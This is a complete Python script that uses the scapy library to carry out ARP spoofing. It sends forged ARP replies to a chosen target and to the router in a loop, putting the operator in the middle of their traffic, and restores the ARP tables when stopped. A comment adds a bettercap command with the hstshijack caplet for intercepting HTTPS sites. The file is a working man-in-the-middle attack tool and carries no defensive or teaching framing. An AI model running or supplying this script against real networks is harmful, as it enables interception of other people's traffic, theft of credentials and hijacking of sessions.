#!/usr/bin/env python
import time
import scapy.all as scapy
import optparse

# in case of https websites
# bettercap -iface eth0 -caplet hstshijack/hstshijack


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="ip_target", help="Enter ip of target")
    parser.add_option("-r", "--gateway", dest="ip_router", help="Enter ip of router")
    (options, arguments) = parser.parse_args()
    if not options.ip_target:
        parser.error("[-] Please enter target ip, use --help for more info")
    if not options.ip_router:
        parser.error("[-] Please enter router ip, use --help for more info")
    return options.ip_target, options.ip_router


def get_mac(ip):
    # creating a arp request
    arp_request = scapy.ARP(pdst=ip)
    # creating broadcast
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # scapy.ls(scapy.Ether())

    # combining arp request and broadcast packets
    arp_request_broadcast = broadcast/arp_request

    try:
        # send and receive arp broadcast packets
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except Exception:
        print("\n[-] Please check target ip or router ip ..... could not reach Target or Gateway")


def spoof(target_ip, spoof_ip):
    hwdst = get_mac(target_ip)
    # set arp op to 2
    # if op=1 it means request and op=2 is response
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=hwdst, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)

def restore_arp(dest_ip, src_ip):
    hwdst = get_mac(dest_ip) # dst mac address
    hwsrc = get_mac(src_ip) # src mac address
    arp_response = scapy.ARP(op=2, pdst=dest_ip, hwdst=hwdst, psrc=src_ip, hwsrc=hwsrc)
    scapy.send(arp_response, verbose=False, count=10)

count=0
ip_target, ip_router = get_arguments()
try:
    while True:
        print("\r[+] Sending "+ str(count) +" packets", end="")
        spoof(ip_target, ip_router)
        spoof(ip_router, ip_target)
        time.sleep(2)
        count += 2
except KeyboardInterrupt:
    print("\n[-] Quitting .........Resetting ARP table")
    restore_arp(ip_target, ip_router)



